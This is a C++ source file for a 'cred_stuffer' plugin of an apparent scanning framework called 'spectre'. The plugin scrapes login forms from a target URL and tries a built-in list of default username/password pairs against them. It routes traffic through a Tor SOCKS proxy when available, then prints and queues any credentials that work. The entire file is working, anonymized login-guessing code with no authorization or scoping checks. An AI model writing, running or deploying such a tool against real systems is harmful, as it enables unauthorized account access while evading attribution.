#include "spectre/plugin.h"
#include "spectre/proof_queue.h"
#include "spectre/tor_proxy.h"
#include <cpr/cpr.h>
#include <iostream>
#include <nlohmann/json.hpp>
#include <regex>

namespace {
class CredStufferPlugin : public spectre::Plugin {
    std::vector<std::pair<std::string, std::string>> common_creds = {
        {"admin", "admin"},
        {"admin", "password"},
        {"admin", "123456"},
        {"root", "root"},
        {"test", "test"},
        {"guest", "guest"}
    };

public:
    std::string name() const override { return "cred_stuffer"; }

    void handle_task(const spectre::Task& task) override {
        if (task.data.value("type", "") != name()) {
            return;
        }

        std::string url = task.data.value("target", "");
        if (url.empty()) {
            return;
        }

        std::cout << "[cred_stuffer] testing " << url << std::endl;

        cpr::Session session;
        session.SetUrl(cpr::Url{url});
        session.SetTimeout(cpr::Timeout{10000});
        if (spectre::TorProxy::get_instance().is_available()) {
            session.SetProxies({{"http", "socks5://127.0.0.1:9050"},
                                {"https", "socks5://127.0.0.1:9050"}});
        }
        cpr::Response r = session.Get();
        if (r.status_code != 200) {
            return;
        }

        std::regex form_regex("<form.*?</form>");
        auto forms_begin = std::sregex_iterator(r.text.begin(), r.text.end(), form_regex);
        auto forms_end = std::sregex_iterator();

        for (std::sregex_iterator i = forms_begin; i != forms_end; ++i) {
            std::string form_html = (*i).str();
            test_form(url, form_html);
        }
    }

private:
    void test_form(const std::string& base_url, const std::string& form_html) {
        std::regex action_regex("action=[\"'](.*?)[\"']");
        std::regex user_field_regex("name=[\"'](user|username|email|login)[\"']");
        std::regex pass_field_regex("name=[\"'](pass|password|secret)[\"']");

        std::smatch action_match, user_match, pass_match;
        std::string action, user_field, pass_field;

        if (std::regex_search(form_html, action_match, action_regex)) {
            action = action_match[1].str();
        } else {
            action = base_url;
        }

        if (!std::regex_search(form_html, user_match, user_field_regex) ||
            !std::regex_search(form_html, pass_match, pass_field_regex)) {
            return;
        }
        user_field = user_match[1].str();
        pass_field = pass_match[1].str();

        for (const auto& [user, pass] : common_creds) {
            cpr::Payload payload = {
                {user_field, user},
                {pass_field, pass}
            };

            cpr::Session login_session;
            login_session.SetUrl(cpr::Url{action});
            login_session.SetPayload(payload);
            login_session.SetTimeout(cpr::Timeout{10000});
            if (spectre::TorProxy::get_instance().is_available()) {
                login_session.SetProxies({{"http", "socks5://127.0.0.1:9050"},
                                          {"https", "socks5://127.0.0.1:9050"}});
            }
            cpr::Response login_r = login_session.Post();

            if ((login_r.status_code == 301 || login_r.status_code == 302 || login_r.status_code == 200) &&
                login_r.text.find(form_html) == std::string::npos) {
                
                std::cout << "[cred_stuffer] VULNERABILITY DISCOVERED" << std::endl;
                std::cout << "  -> Target: " << base_url << std::endl;
                std::cout << "  -> Credentials: " << user << ":" << pass << std::endl;
                submit_proof(base_url, user, pass, action);
                return;
            }
        }
    }
    
    void submit_proof(const std::string& target, const std::string& user, const std::string& pass, const std::string& endpoint) {
        nlohmann::json evidence;
        evidence["description"] = "Default or weak credentials accepted at a login endpoint.";
        evidence["username"] = user;
        evidence["password"] = pass;
        evidence["endpoint"] = endpoint;
        
        spectre::VulnProof proof = {
            target,
            "DEFAULT_CREDENTIALS",
            evidence,
            std::to_string(std::time(nullptr)),
            ""
        };
        
        spectre::enqueue_proof(proof);
        std::cout << "[cred_stuffer] proof queued" << std::endl;
    }
};

} // namespace

extern "C" spectre::Plugin* spectre_create_plugin() {
    return new CredStufferPlugin();
} 